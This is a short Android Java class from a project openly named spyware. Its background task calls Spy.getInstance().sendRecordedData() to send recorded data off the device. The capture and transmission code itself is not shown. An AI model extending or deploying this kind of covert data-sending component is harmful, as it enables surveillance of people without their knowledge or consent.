package com.example.cristianturetta.spyware;

import android.os.AsyncTask;

public class SpyAsyncTask extends AsyncTask<Void, Void, Void> {
    /**
     * Override this method to perform a computation on a background thread. The
     * specified parameters are the parameters passed to {@link #execute}
     * by the caller of this task.
     * <p>
     * This method can call {@link #publishProgress} to publish updates
     * on the UI thread.
     *
     * @param voids The parameters of the task.
     * @return A result, defined by the subclass of this task.
     * @see #onPreExecute()
     * @see #onPostExecute
     * @see #publishProgress
     */
    @Override
    protected Void doInBackground(Void... voids) {
        //Spy.getInstance().sendRecordedData();
        Spy.getInstance().sendRecordedData();
        return null;
    }
}